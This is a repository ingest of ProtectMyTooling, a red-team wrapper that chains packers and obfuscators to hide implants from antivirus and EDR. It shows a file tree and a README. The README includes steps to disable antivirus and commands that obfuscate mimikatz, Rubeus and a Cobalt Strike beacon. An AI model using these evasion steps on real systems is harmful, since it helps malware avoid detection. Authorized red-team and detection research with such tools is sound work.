Directory structure:
└── mgeeky-protectmytooling/
    ├── README.md
    ├── install.ps1
    ├── install.sh
    ├── ProtectMyTooling.py
    ├── ProtectMyToolingGUI.pyw
    ├── RedBackdoorer.py
    ├── RedWatermarker.py
    ├── requirements.txt
    ├── CobaltStrike/
    │   ├── cobaltProtectMyTooling.py
    │   └── ProtectMyTooling.cna
    ├── config/
    │   ├── ProtectMyTooling.yaml
    │   └── sample-full-config.yaml
    ├── contrib/
    │   ├── _project-files/
    │   │   ├── CallObf/
    │   │   │   └── configExample.ini
    │   │   ├── ConfuserEx/
    │   │   │   ├── beds-maximum.crproj
    │   │   │   ├── maximum.crproj
    │   │   │   ├── mkaring-maximum.crproj
    │   │   │   └── neo-maximum.crproj
    │   │   ├── enigma-projects/
    │   │   │   └── full-x86-1.enigma
    │   │   ├── netreactor-projects/
    │   │   │   └── net-reactor-full1.nrproj
    │   │   ├── PEunion/
    │   │   │   ├── dotnet64.peu
    │   │   │   ├── dotnet86.peu
    │   │   │   └── native86.peu
    │   │   ├── smartassembly-projects/
    │   │   │   └── full1.saproj
    │   │   ├── themida-projects/
    │   │   │   └── advanced-tiger-red.tmd
    │   │   ├── vmprotect/
    │   │   │   └── full-vmprotect.vmp
    │   │   └── vmprotect-projects/
    │   │       └── full-vmprotect.vmp
    │   ├── amber/
    │   │   └── LICENSE
    │   ├── ConfuserEx/
    │   │   ├── active-mkaring/
    │   │   │   ├── Confuser.CLI.exe.config
    │   │   │   └── ConfuserEx.exe.config
    │   │   └── original/
    │   │       ├── Confuser.CLI.exe.config
    │   │       └── ConfuserEx.exe.config
    │   ├── Hyperion/
    │   │   ├── license.txt
    │   │   ├── readme.txt
    │   │   ├── Fasm/
    │   │   │   ├── license.TXT
    │   │   │   └── INCLUDE/
    │   │   │       ├── WIN32A.INC
    │   │   │       ├── WIN32AX.INC
    │   │   │       ├── WIN32AXP.INC
    │   │   │       ├── WIN32W.INC
    │   │   │       ├── WIN32WX.INC
    │   │   │       ├── WIN32WXP.INC
    │   │   │       ├── WIN64A.INC
    │   │   │       ├── WIN64AX.INC
    │   │   │       ├── WIN64AXP.INC
    │   │   │       ├── WIN64W.INC
    │   │   │       ├── WIN64WX.INC
    │   │   │       ├── WIN64WXP.INC
    │   │   │       ├── API/
    │   │   │       │   ├── ADVAPI32.INC
    │   │   │       │   ├── COMCTL32.INC
    │   │   │       │   ├── COMDLG32.INC
    │   │   │       │   ├── GDI32.INC
    │   │   │       │   ├── KERNEL32.INC
    │   │   │       │   ├── SHELL32.INC
    │   │   │       │   ├── USER32.INC
    │   │   │       │   └── WSOCK32.INC
    │   │   │       ├── ENCODING/
    │   │   │       │   ├── UTF8.INC
    │   │   │       │   ├── WIN1250.INC
    │   │   │       │   ├── WIN1251.INC
    │   │   │       │   ├── WIN1252.INC
    │   │   │       │   ├── WIN1253.INC
    │   │   │       │   ├── WIN1254.INC
    │   │   │       │   ├── WIN1255.INC
    │   │   │       │   ├── WIN1256.INC
    │   │   │       │   ├── WIN1257.INC
    │   │   │       │   ├── WIN1258.INC
    │   │   │       │   └── WIN874.INC
    │   │   │       ├── EQUATES/
    │   │   │       │   ├── COMCTL32.INC
    │   │   │       │   ├── COMCTL64.INC
    │   │   │       │   ├── COMDLG32.INC
    │   │   │       │   ├── COMDLG64.INC
    │   │   │       │   ├── GDI32.INC
    │   │   │       │   ├── GDI64.INC
    │   │   │       │   ├── KERNEL32.INC
    │   │   │       │   ├── KERNEL64.INC
    │   │   │       │   ├── SHELL32.INC
    │   │   │       │   ├── SHELL64.INC
    │   │   │       │   ├── USER32.INC
    │   │   │       │   ├── USER64.INC
    │   │   │       │   └── WSOCK32.INC
    │   │   │       ├── MACRO/
    │   │   │       │   ├── COM32.INC
    │   │   │       │   ├── COM64.INC
    │   │   │       │   ├── EXPORT.INC
    │   │   │       │   ├── IF.INC
    │   │   │       │   ├── IMPORT32.INC
    │   │   │       │   ├── IMPORT64.INC
    │   │   │       │   ├── MASM.INC
    │   │   │       │   ├── PROC32.INC
    │   │   │       │   ├── PROC64.INC
    │   │   │       │   ├── RESOURCE.INC
    │   │   │       │   └── STRUCT.INC
    │   │   │       └── PCOUNT/
    │   │   │           ├── ADVAPI32.INC
    │   │   │           ├── COMCTL32.INC
    │   │   │           ├── COMDLG32.INC
    │   │   │           ├── GDI32.INC
    │   │   │           ├── KERNEL32.INC
    │   │   │           ├── SHELL32.INC
    │   │   │           ├── USER32.INC
    │   │   │           └── WSOCK32.INC
    │   │   └── Src/
    │   │       ├── Container/
    │   │       │   ├── 32/
    │   │       │   │   ├── createstrings.inc
    │   │       │   │   ├── hyperion.inc
    │   │       │   │   ├── loadapis.asm
    │   │       │   │   ├── loadexecutable.asm
    │   │       │   │   ├── logfile_disable.asm
    │   │       │   │   ├── logfile_enable.asm
    │   │       │   │   ├── main.asm
    │   │       │   │   └── pe.inc
    │   │       │   └── 64/
    │   │       │       ├── decryption_payload.asm
    │   │       │       ├── image_base.inc
    │   │       │       ├── image_size.inc
    │   │       │       ├── infile_array.inc
    │   │       │       ├── infile_size.inc
    │   │       │       ├── key_size.inc
    │   │       │       ├── loadexecutable.asm
    │   │       │       ├── logfile_disable.asm
    │   │       │       ├── logfile_enable.asm
    │   │       │       ├── logfile_select.asm
    │   │       │       ├── main.asm
    │   │       │       ├── main_prolog.inc
    │   │       │       └── pe.inc
    │   │       ├── Crypter/
    │   │       │   ├── aes.c
    │   │       │   ├── encryption.c
    │   │       │   ├── fasmoutput.c
    │   │       │   ├── fasmoutput.h
    │   │       │   ├── fileaccess.c
    │   │       │   ├── hyperion.c
    │   │       │   ├── hyperion.h
    │   │       │   ├── pe.h
    │   │       │   ├── pe32.c
    │   │       │   ├── pe64.c
    │   │       │   ├── pe_general.c
    │   │       │   ├── secure_string.c
    │   │       │   └── verbose.c
    │   │       └── Payloads/
    │   │           └── Aes/
    │   │               ├── 32/
    │   │               │   ├── aes.asm
    │   │               │   ├── aes.inc
    │   │               │   ├── aes_constants_intern.inc
    │   │               │   ├── decryptexecutable.asm
    │   │               │   ├── decryptionrounds.asm
    │   │               │   ├── encryptionrounds.asm
    │   │               │   ├── galois.asm
    │   │               │   ├── keychain.asm
    │   │               │   ├── license.txt
    │   │               │   ├── rcon.asm
    │   │               │   └── sbox.asm
    │   │               ├── 64/
    │   │               │   ├── aes.asm
    │   │               │   ├── aes.inc
    │   │               │   ├── aes_constants_intern.inc
    │   │               │   ├── decryptexecutable.asm
    │   │               │   ├── decryptionrounds.asm
    │   │               │   ├── encryptionrounds.asm
    │   │               │   ├── galois.asm
    │   │               │   ├── keychain.asm
    │   │               │   ├── license.txt
    │   │               │   ├── rcon.asm
    │   │               │   └── sbox.asm
    │   │               └── c/
    │   │                   ├── aes.c
    │   │                   ├── aes.h
    │   │                   └── unlicense.txt
    │   ├── Invoke-Obfuscation/
    │   │   ├── README.md
    │   │   ├── Invoke-Obfuscation.ps1
    │   │   ├── Invoke-Obfuscation.psd1
    │   │   ├── Invoke-Obfuscation.psm1
    │   │   ├── LICENSE
    │   │   ├── Out-CompressedCommand.ps1
    │   │   ├── Out-EncodedAsciiCommand.ps1
    │   │   ├── Out-EncodedBinaryCommand.ps1
    │   │   ├── Out-EncodedBXORCommand.ps1
    │   │   ├── Out-EncodedHexCommand.ps1
    │   │   ├── Out-EncodedOctalCommand.ps1
    │   │   ├── Out-EncodedSpecialCharOnlyCommand.ps1
    │   │   ├── Out-EncodedWhitespaceCommand.ps1
    │   │   ├── Out-ObfuscatedAst.ps1
    │   │   ├── Out-ObfuscatedStringCommand.ps1
    │   │   ├── Out-ObfuscatedTokenCommand.ps1
    │   │   ├── Out-PowerShellLauncher.ps1
    │   │   └── Out-SecureStringCommand.ps1
    │   ├── LoGIC.NET/
    │   │   ├── dnlib.xml
    │   │   └── LoGiC.NET.exe.config
    │   ├── Mangle/
    │   │   └── signed-executables/
    │   │       └── WINWORD.EXE
    │   ├── MPRESS/
    │   │   ├── BugReport.txt
    │   │   ├── FAQ.TXT
    │   │   ├── History.txt
    │   │   └── license.txt
    │   ├── Nimcrypt2/
    │   │   ├── README.md
    │   │   ├── GetSyscallStub.nim
    │   │   ├── LICENSE
    │   │   ├── nimcrypt.nim
    │   │   └── syscalls.nim
    │   ├── NimPackt-v1/
    │   │   ├── README.md
    │   │   ├── LICENSE
    │   │   ├── NimPackt.cna
    │   │   ├── NimPackt.py
    │   │   ├── NimPackt.yar
    │   │   ├── dist/
    │   │   │   └── shellycoat_x64.bin
    │   │   └── templates/
    │   │       ├── NimPackt-Template.nim
    │   │       └── syscalls.nim
    │   ├── pe_tools/
    │   │   ├── README.md
    │   │   ├── LICENSE
    │   │   ├── setup.py
    │   │   ├── VERSION
    │   │   └── pe_tools/
    │   │       ├── __init__.py
    │   │       ├── pe_parser.py
    │   │       ├── peresed.py
    │   │       ├── rsrc.py
    │   │       ├── struct3.py
    │   │       ├── utils.py
    │   │       └── version_info.py
    │   ├── peCloakCapstone/
    │   │   ├── README.md
    │   │   ├── peCloak.py
    │   │   └── SectionDoubleP.py
    │   ├── PEunion/
    │   │   ├── LICENSE-3RD-PARTY.md
    │   │   ├── LICENSE.md
    │   │   ├── peubuild.exe.config
    │   │   ├── PEunion.exe.config
    │   │   ├── Config/
    │   │   │   ├── recent.ini
    │   │   │   ├── rtlo_extension_alternatives.ini
    │   │   │   └── viewstate.ini
    │   │   ├── FASM/
    │   │   │   ├── FASM.EXE
    │   │   │   └── INCLUDE/
    │   │   │       ├── WIN32A.INC
    │   │   │       ├── WIN32AX.INC
    │   │   │       ├── WIN32AXP.INC
    │   │   │       ├── WIN32W.INC
    │   │   │       ├── WIN32WX.INC
    │   │   │       ├── WIN32WXP.INC
    │   │   │       ├── WIN64A.INC
    │   │   │       ├── WIN64AX.INC
    │   │   │       ├── WIN64AXP.INC
    │   │   │       ├── WIN64W.INC
    │   │   │       ├── WIN64WX.INC
    │   │   │       ├── WIN64WXP.INC
    │   │   │       ├── API/
    │   │   │       │   ├── ADVAPI32.INC
    │   │   │       │   ├── COMCTL32.INC
    │   │   │       │   ├── COMDLG32.INC
    │   │   │       │   ├── GDI32.INC
    │   │   │       │   ├── KERNEL32.INC
    │   │   │       │   ├── SHELL32.INC
    │   │   │       │   ├── USER32.INC
    │   │   │       │   └── WSOCK32.INC
    │   │   │       ├── ENCODING/
    │   │   │       │   ├── UTF8.INC
    │   │   │       │   ├── WIN1250.INC
    │   │   │       │   ├── WIN1251.INC
    │   │   │       │   ├── WIN1252.INC
    │   │   │       │   ├── WIN1253.INC
    │   │   │       │   ├── WIN1254.INC
    │   │   │       │   ├── WIN1255.INC
    │   │   │       │   ├── WIN1256.INC
    │   │   │       │   ├── WIN1257.INC
    │   │   │       │   ├── WIN1258.INC
    │   │   │       │   └── WIN874.INC
    │   │   │       ├── EQUATES/
    │   │   │       │   ├── COMCTL32.INC
    │   │   │       │   ├── COMCTL64.INC
    │   │   │       │   ├── COMDLG32.INC
    │   │   │       │   ├── COMDLG64.INC
    │   │   │       │   ├── GDI32.INC
    │   │   │       │   ├── GDI64.INC
    │   │   │       │   ├── KERNEL32.INC
    │   │   │       │   ├── KERNEL64.INC
    │   │   │       │   ├── SHELL32.INC
    │   │   │       │   ├── SHELL64.INC
    │   │   │       │   ├── USER32.INC
    │   │   │       │   ├── USER64.INC
    │   │   │       │   └── WSOCK32.INC
    │   │   │       ├── MACRO/
    │   │   │       │   ├── COM32.INC
    │   │   │       │   ├── COM64.INC
    │   │   │       │   ├── EXPORT.INC
    │   │   │       │   ├── IF.INC
    │   │   │       │   ├── IMPORT32.INC
    │   │   │       │   ├── IMPORT64.INC
    │   │   │       │   ├── MASM.INC
    │   │   │       │   ├── PROC32.INC
    │   │   │       │   ├── PROC64.INC
    │   │   │       │   ├── RESOURCE.INC
    │   │   │       │   └── STRUCT.INC
    │   │   │       └── PCOUNT/
    │   │   │           ├── ADVAPI32.INC
    │   │   │           ├── COMCTL32.INC
    │   │   │           ├── COMDLG32.INC
    │   │   │           ├── GDI32.INC
    │   │   │           ├── KERNEL32.INC
    │   │   │           ├── SHELL32.INC
    │   │   │           ├── USER32.INC
    │   │   │           └── WSOCK32.INC
    │   │   ├── Help/
    │   │   │   ├── Default.md
    │   │   │   ├── Template.html
    │   │   │   ├── App/
    │   │   │   │   └── Changelog.md
    │   │   │   ├── Project/
    │   │   │   │   ├── Manifest.md
    │   │   │   │   ├── StartupMelt.md
    │   │   │   │   ├── StubIcon.md
    │   │   │   │   ├── StubPadding.md
    │   │   │   │   ├── StubType.md
    │   │   │   │   ├── VersionInfo.md
    │   │   │   │   └── Items/
    │   │   │   │       ├── Drop.md
    │   │   │   │       ├── Invoke.md
    │   │   │   │       ├── MessageBox.md
    │   │   │   │       ├── RunPE.md
    │   │   │   │       └── Source.md
    │   │   │   └── Rtlo/
    │   │   │       ├── Icon.md
    │   │   │       ├── NewFilename.md
    │   │   │       ├── OriginalFile.md
    │   │   │       └── Preview.md
    │   │   └── Stub/
    │   │       ├── dotnet/
    │   │       │   ├── Api.cs
    │   │       │   ├── Compression.cs
    │   │       │   ├── Download.cs
    │   │       │   ├── Drop.cs
    │   │       │   ├── Emulator.cs
    │   │       │   ├── GetResource.cs
    │   │       │   ├── Invoke.cs
    │   │       │   ├── RunPE.cs
    │   │       │   ├── Stage2.cs
    │   │       │   ├── Stub.cs
    │   │       │   └── Resources/
    │   │       │       ├── default.manifest
    │   │       │       └── elevated.manifest
    │   │       └── pe32/
    │   │           ├── Compression.asm
    │   │           ├── Download.asm
    │   │           ├── Drop.asm
    │   │           ├── Emulator.asm
    │   │           ├── Melt.asm
    │   │           ├── nt.inc
    │   │           ├── PebApi.asm
    │   │           ├── PebApi.inc
    │   │           ├── RunPE.asm
    │   │           ├── Stage2.asm
    │   │           ├── Stub.asm
    │   │           ├── Api/
    │   │           │   ├── kernel32.inc
    │   │           │   ├── msvcrt.inc
    │   │           │   └── shlwapi.inc
    │   │           ├── Obfuscator/
    │   │           │   ├── nop.txt
    │   │           │   ├── nop_minimal.txt
    │   │           │   └── register.txt
    │   │           └── Resources/
    │   │               ├── default.manifest
    │   │               └── elevated.manifest
    │   ├── ScareCrow/
    │   │   ├── osslsigncode
    │   │   └── ScareCrow
    │   ├── sgn/
    │   │   └── LICENSE
    │   ├── sRDI/
    │   │   ├── ConvertToShellcode.py
    │   │   ├── Python.pyproj
    │   │   └── ShellcodeRDI.py
    │   └── upx/
    │       ├── upx-3.96-amd64_linux/
    │       │   ├── README
    │       │   ├── README.1ST
    │       │   ├── upx
    │       │   ├── upx.1
    │       │   └── upx.doc
    │       ├── upx-3.96-i386_linux/
    │       │   ├── README
    │       │   ├── README.1ST
    │       │   ├── upx
    │       │   ├── upx.1
    │       │   └── upx.doc
    │       ├── upx-3.96-win32/
    │       │   ├── README
    │       │   ├── README.1ST
    │       │   ├── upx.1
    │       │   └── upx.doc
    │       └── upx-3.96-win64/
    │           ├── README
    │           ├── README.1ST
    │           ├── THANKS
    │           ├── upx.1
    │           └── upx.doc
    ├── data/
    │   ├── all-functions.txt
    │   └── dodgy-functions.txt
    ├── lib/
    │   ├── __init__.py
    │   ├── logger.py
    │   ├── optionsparser.py
    │   ├── packersloader.py
    │   └── utils.py
    └── packers/
        ├── __init__.py
        ├── amber.py
        ├── asstrongasfuck.py
        ├── atompepacker.py
        ├── backdoor.py
        ├── callobf.py
        ├── confuserex.py
        ├── donut-packer.py
        ├── enigma.py
        ├── freeze.py
        ├── hyperion.py
        ├── intellilock.py
        ├── invobf.py
        ├── IPacker.py
        ├── logicnet.py
        ├── mangle.py
        ├── mpress.py
        ├── netreactor.py
        ├── netshrink.py
        ├── nimcrypt2.py
        ├── nimpackt.py
        ├── nimsyscall.py
        ├── packer64.py
        ├── pe2shc.py
        ├── pecloak.py
        ├── peresed.py
        ├── peunion.py
        ├── scarecrow.py
        ├── sgn.py
        ├── smartassembly.py
        ├── srdi.py
        ├── themida.py
        ├── upx.py
        └── vmprotect.py


Files Content:

(Files content cropped to 300k characters, download full ingest to see more)
================================================
FILE: README.md
================================================
![1.png](images/1.png)

# Don't Detect Tools - Detect Techniques

Rationale behind releasing this software was outlined in an acompanying blog post:

- [ProtectMyTooling - Don't detect tools, detect techniques](https://mgeeky.tech/protectmytooling/)

## Intro

Script that wraps around multitude of packers, protectors, obfuscators, shellcode loaders, encoders, generators to produce complex protected Red Team implants.
Your perfect companion in Malware Development CI/CD pipeline, **helping watermark your artifacts, collect IOCs, backdoor and more**.

**ProtectMyToolingGUI.py**

![3.png](images/3.png)


With `ProtectMyTooling` you can quickly obfuscate your binaries without having to worry about clicking through all the Dialogs, interfaces, menus, creating projects to obfuscate a single binary, clicking through all the options available and wasting time about all that nonsense. It takes you straight to the point - to obfuscate your tool.

Aim is to offer the most convenient interface possible and allow to leverage _a daisy-chain of multiple packers_ combined on a single binary.

That's right - we can launch `ProtectMyTooling` with several packers at once:

```
C:\> py ProtectMyTooling.py hyperion,upx mimikatz.exe mimikatz-obf.exe
```

The above example will firstly pass `mimikatz.exe` to the Hyperion for obfuscation, and then the result will be provided to UPX for compression. Resulting with `UPX(Hyperion(file))`


## Features

- Supports multiple different PE Packers, .NET Obfuscators, Shellcode Loaders/Builders
- Allows daisy-chaining packers where output from a packer is passed to the consecutive one: `callobf,hyperion,upx` will produce artifact `UPX(Hyperion(CallObf(file)))`
- Collects IOCs at every obfuscation step so that auditing & Blue Team requests can be satisfied
- Offers functionality to inject custom Watermarks to resulting PE artifacts - in DOS Stub, Checksum, as a standalone PE Section, to file's Overlay
- Comes up with a handy Cobalt Strike aggressor script bringing `protected-upload` and `protected-execute-assembly` commands
- Straightforward command line usage


## Installation

**This tool was designed to work on Windows, as most packers natively target that platform.**

Some features may work however on Linux just fine, nonetheless that support is not fully tested, please report bugs and issues.

1. First, **disable your AV** and add `contrib` directory to exclusions. That directory contains obfuscators, protectors which will get flagged by AV and removed.
2. Then clone this repository
```
PS C:\> git clone --recurse https://github.com/Binary-Offensive/ProtectMyTooling
```

3. Actual installation is straightforward:

  **Windows**
```
PS C:\ProtectMyTooling> .\install.ps1
```

  **Linux**
```
bash# ./install.sh
```

### Gimmicks

For `ScareCrow` packer to run on Windows 10, there needs to be `WSL` installed and `bash.exe` available (in `%PATH%`).
Then, in WSL one needs to have `golang` installed in version at least `1.16`:

```
cmd> bash
bash$ sudo apt update ; sudo apt upgrade -y ; sudo apt install golang=2:1.18~3 -y
```

## Configuration

To plug-in supported obfuscators, change default options or point **ProtectMyTooling** to your obfuscator executable path, you will need to adjust `config\ProtectMyTooling.yaml` configuration file.

There is also `config\sample-full-config.yaml` file containing all the available options for all the supported packers, serving as reference point.


## Friendly reminder

- If your produced binary crashes or doesn't run as expected - try using different packers chain.
- Packers don't guarantee stability of produced binaries, therefore ProtectMyTooling cannot as well.
- While chaining, carefully match output->input payload formats according to what consecutive packer expects.

---

## Usage

Before `ProtectMyTooling`'s first use, it is essential to adjust program's YAML configuration file `ProtectMyTooling.yaml`.
The order of parameters processal is following:

- Firstly default parameters are used
- Then they're overwritten by values coming from YAML
- Finally, whatever is provided in command line will overwrite corresponding values

There, supported packer paths and options shall be set to enable.

### Scenario 1: Simple ConfuserEx obfuscation

Usage is very simple, all it takes is to pass the name of obfuscator to choose, input and output file paths:

```
C:\> py ProtectMyTooling.py confuserex Rubeus.exe Rubeus-obf.exe

    ::::::::::.:::::::..      ...  :::::::::::.,::::::  .,-::::::::::::::::
     `;;;```.;;;;;;``;;;;  .;;;;;;;;;;;;;;;\''';;;;\'\''',;;;'````;;;;;;;;\'\'''
      `]]nnn]]' [[[,/[[[' ,[[     \[[,  [[     [[cccc [[[           [[
       $$$""    $$$$$$c   $$$,     $$$  $$     $$"""" $$$           $$
       888o     888b "88bo"888,_ _,88P  88,    888oo,_`88bo,__,o,   88,
    .  YMMMb :.-:.MM   ::-. "YMMMMMP"   MMM    """"YUMMM"YUMMMMMP"  MMM
    ;;,.    ;;;';;.   ;;;;'
    [[[[, ,[[[[, '[[,[[['
    $$$$$$$$"$$$   c$$"
    888 Y88" 888o,8P"`
    ::::::::::::mM...        ...     :::    :::::.    :::. .,-:::::/
    ;;;;;;;;\'''.;;;;;;;.  .;;;;;;;.  ;;;    ;;`;;;;,  `;;,;;-'````'
         [[   ,[[     \[[,[[     \[[,[[[    [[[ [[[[[. '[[[[   [[[[[[/
         $$   $$$,     $$$$$,     $$$$$'    $$$ $$$ "Y$c$"$$c.    "$$
         88,  "888,_ _,88"888,_ _,88o88oo,._888 888    Y88`Y8bo,,,o88o
         MMM    "YMMMMMP"  "YMMMMMP"""""YUMMMMM MMM     YM  `'YMUP"YMM

    Red Team implants protection swiss knife.

    Multi-Packer wrapping around multitude of packers, protectors, shellcode loaders, encoders.
    Mariusz Banach / mgeeky '20-'22, <mb@binary-offensive.com>
    v0.16

[.] Processing x86 file: "\Rubeus.exe"
[.] Generating output of ConfuserEx(<file>)...

[+] SUCCEEDED. Original file size: 417280 bytes, new file size ConfuserEx(<file>): 756224, ratio: 181.23%
```

### Scenario 2: Simple ConfuserEx obfuscation followed by artifact test

One can also obfuscate the file and immediately attempt to launch it (also with supplied optional parameters) to ensure it runs fine with options `-r --cmdline CMDLINE`:

```
C:\> py ProtectMyTooling.py confuserex Rubeus.exe Rubeus-obf.exe -r --cmdline "hash /password:foobar"

    [...]

[.] Processing x86 file: "\Rubeus.exe"
[.] Generating output of ConfuserEx(<file>)...

[+] SUCCEEDED. Original file size: 417280 bytes, new file size ConfuserEx(<file>): 758272, ratio: 181.72%


Running application to test it...

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0


[*] Action: Calculate Password Hash(es)

[*] Input password             : foobar
[*]       rc4_hmac             : BAAC3929FABC9E6DCD32421BA94A84D4

[!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types!
```

### Scenario 3: Complex malware obfuscation with watermarking and IOCs collection

Below use case takes `beacon.exe` on input and feeds it consecutively into `CallObf` -> `UPX` -> `Hyperion` packers.

Then it will inject specified `fooobar` watermark to the final generated output artifact's DOS Stub as well as modify that artifact's checksum with value `0xAABBCCDD`.

Finally, ProtectMyTooling will capture all IOCs (md5, sha1, sha256, imphash, and other metadata) and save them in auxiliary CSV file. That file can be used for IOC matching as engagement unfolds.

```
PS> py .\ProtectMyTooling.py callobf,upx,hyperion beacon.exe beacon-obf.exe -i -I operation_chimera -w dos-stub=fooobar -w checksum=0xaabbccdd

    [...]

[.] Processing x64 file: "beacon.exe"
[>] Generating output of CallObf(<file>)...

[.] Before obfuscation file's PE IMPHASH:       17b461a082950fc6332228572138b80c
[.] After obfuscation file's PE IMPHASH:        378d9692fe91eb54206e98c224a25f43
[>] Generating output of UPX(CallObf(<file>))...

[>] Generating output of Hyperion(UPX(CallObf(<file>)))...

[+] Setting PE checksum to 2864434397 (0xaabbccdd)
[+] Successfully watermarked resulting artifact file.
[+] IOCs written to: beacon-obf-ioc.csv

[+] SUCCEEDED. Original file size: 288256 bytes, new file size Hyperion(UPX(CallObf(<file>))): 175616, ratio: 60.92%
```

Produced IOCs evidence CSV file will look as follows:

```csv
timestamp,filename,author,context,comment,md5,sha1,sha256,imphash
2022-06-10 03:15:52,beacon.exe,mgeeky@commandoVM,Input File,test,dcd6e13754ee753928744e27e98abd16,298de19d4a987d87ac83f5d2d78338121ddb3cb7,0a64768c46831d98c5667d26dc731408a5871accefd38806b2709c66cd9d21e4,17b461a082950fc6332228572138b80c
2022-06-10 03:15:52,y49981l3.bin,mgeeky@commandoVM,Obfuscation artifact: CallObf(<file>),test,50bbce4c3cc928e274ba15bff0795a8c,15bde0d7fbba1841f7433510fa9aa829f8441aeb,e216cd8205f13a5e3c5320ba7fb88a3dbb6f53ee8490aa8b4e1baf2c6684d27b,378d9692fe91eb54206e98c224a25f43
2022-06-10 03:15:53,nyu2rbyx.bin,mgeeky@commandoVM,Obfuscation artifact: UPX(CallObf(<file>)),test,4d3584f10084cded5c6da7a63d42f758,e4966576bdb67e389ab1562e24079ba9bd565d32,97ba4b17c9bd9c12c06c7ac2dc17428d509b64fc8ca9e88ee2de02c36532be10,9aebf3da4677af9275c461261e5abde3
2022-06-10 03:15:53,beacon-obf.exe,mgeeky@commandoVM,Obfuscation artifact: Hyperion(UPX(CallObf(<file>))),test,8b706ff39dd4c8f2b031c8fa6e3c25f5,c64aad468b1ecadada3557cb3f6371e899d59790,087c6353279eb5cf04715ef096a18f83ef8184aa52bc1d5884e33980028bc365,a46ea633057f9600559d5c6b328bf83d
2022-06-10 03:15:53,beacon-obf.exe,mgeeky@commandoVM,Output obfuscated artifact,test,043318125c60d36e0b745fd38582c0b8,a7717d1c47cbcdf872101bd488e53b8482202f7f,b3cf4311d249d4a981eb17a33c9b89eff656fff239e0d7bb044074018ec00e20,a46ea633057f9600559d5c6b328bf83d
```


## Supported Packers

`ProtectMyTooling` was designed to support not only Obfuscators/Packers but also all sort of builders/generators/shellcode loaders usable from the command line.

At the moment, program supports various Commercial and Open-Source packers/obfuscators. Those Open-Source ones are bundled within the project.
Commercial ones will require user to purchase the product and configure its location in `ProtectMyTooling.yaml` file to point the script where to find them.

1. [`Amber`](https://github.com/EgeBalci/amber) - Reflective PE Packer that takes EXE/DLL on input and produces EXE/PIC shellcode
2. [`AtomPePacker`](https://github.com/ORCx41/AtomPePacker) - A Highly capable Pe Packer
3. [`AsStrongAsFuck`](https://github.com/Charterino/AsStrongAsFuck) - A console obfuscator for .NET assemblies by Charterino
4. [`CallObfuscator`](https://github.com/d35ha/CallObfuscator) - Obfuscates specific windows apis with different apis.
5. [`ConfuserEx`](https://github.com/mkaring/ConfuserEx) - Popular .NET obfuscator, forked from [Martin Karing](https://github.com/mkaring)
6. [`Donut`](https://github.com/TheWover/donut) - Popular PE loader that takes EXE/DLL/.NET on input and produces a PIC shellcode
7. [`Enigma`](https://enigmaprotector.com/) - A powerful system designed for comprehensive protection of executable files
8. [`Freeze`](https://github.com/optiv/Freeze) - Takes input EXE/DLL file and produces output one with cloned certificate, removed Golang-specific IoCs and bloated size. By Matt Eidelberg (@Tyl0us).
9. [`Hyperion`](https://nullsecurity.net/tools/binary.html) - runtime encrypter for 32-bit and 64-bit portable executables. It is a reference implementation and bases on the paper "Hyperion: Implementation of a PE-Crypter"
10. [`IntelliLock`](https://www.eziriz.com/intellilock.htm) - combines strong license security, highly adaptable licensing functionality/schema with reliable assembly protection
11. [`InvObf`](https://github.com/danielbohannon/Invoke-Obfuscation) - Obfuscates Powershell scripts with `Invoke-Obfuscation` (by Daniell Bohannon)
12. [`LoGiC.NET`](https://github.com/AnErrupTion/LoGiC.NET) - A more advanced free and open .NET obfuscator using dnlib by AnErrupTion
13. [`Mangle`](https://github.com/optiv/Mangle) - Takes input EXE/DLL file and produces output one with cloned certificate, removed Golang-specific IoCs and bloated size. By Matt Eidelberg (@Tyl0us).
14. [`MPRESS`](https://www.autohotkey.com/mpress/mpress_web.htm) - MPRESS compressor by Vitaly Evseenko. Takes input EXE/DLL/.NET/MAC-DARWIN (x86/x64) and compresses it.
15. [`NetReactor`](https://www.eziriz.com/dotnet_reactor.htm) - Unmatched .NET code protection system which completely stops anyone from decompiling your code
16. [`NetShrink`](https://www.pelock.com/pl/produkty/netshrink) - an exe packer aka executable compressor, application password protector and virtual DLL binder for Windows & Linux .NET applications.
17. [`Nimcrypt2`](https://github.com/icyguider/Nimcrypt2) - Generates Nim loader running input .NET, PE or Raw Shellcode. Authored by [(@icyguider)](https://twitter.com/icyguider)
18. [`NimPackt-v1`](https://github.com/chvancooten/NimPackt-v1) - Takes Shellcode or .NET Executable on input, produces EXE or DLL loader. Brought to you by Cas van Cooten [(@chvancooten)](https://twitter.com/chvancooten)
19. [`NimSyscallPacker`](https://github.com/S3cur3Th1sSh1t-Sponsors/NimSyscallPacker) - Takes PE/Shellcode/.NET executable and generates robust Nim+Syscalls EXE/DLL loader. Sponsorware authored by [(@S3cur3Th1sSh1t)](https://twitter.com/ShitSecure)
20. [`Packer64`](https://github.com/jadams/Packer64) - wrapper around John Adams' `Packer64`
21. [`pe2shc`](https://github.com/hasherezade/pe_to_shellcode) - Converts PE into a shellcode. By yours truly [@hasherezade](https://twitter.com/hasherezade)
22. [`peCloak`](https://github.com/v-p-b/peCloakCapstone/blob/master/peCloak.py) - A Multi-Pass Encoder & Heuristic Sandbox Bypass AV Evasion Tool
23. [`peresed`](https://github.com/avast/pe_tools) - Uses _"peresed"_ from **avast/pe_tools** to remove all existing PE Resources and signature _(think of Mimikatz icon)._
24. [`peunion`](https://bytecode77.com/pe-union) - Encrypts executables (x86 or .NET x86/x64), which are decrypted at runtime and executed in-memory
25. [`ScareCrow`](https://github.com/optiv/ScareCrow) - EDR-evasive x64 shellcode loader that produces DLL/CPL/XLL/JScript/HTA artifact loader
26. [`sgn`](https://github.com/EgeBalci/sgn) - Shikata ga nai (仕方がない) encoder ported into go with several improvements. Takes shellcode, produces encoded shellcode
27. [`SmartAssembly`](https://www.red-gate.com/products/dotnet-development/smartassembly/) - obfuscator that helps protect your application against reverse-engineering or modification, by making it difficult for a third-party to access your source code
28. [`sRDI`](https://github.com/monoxgas/sRDI) - Convert DLLs to position independent shellcode. Authored by: [Nick Landers, @monoxgas](https://twitter.com/monoxgas)
29. [`Themida`](https://www.oreans.com/Themida.php) - Advanced Windows software protection system
30. [`UPX`](https://upx.github.io/) - a free, portable, extendable, high-performance executable packer for several executable formats.
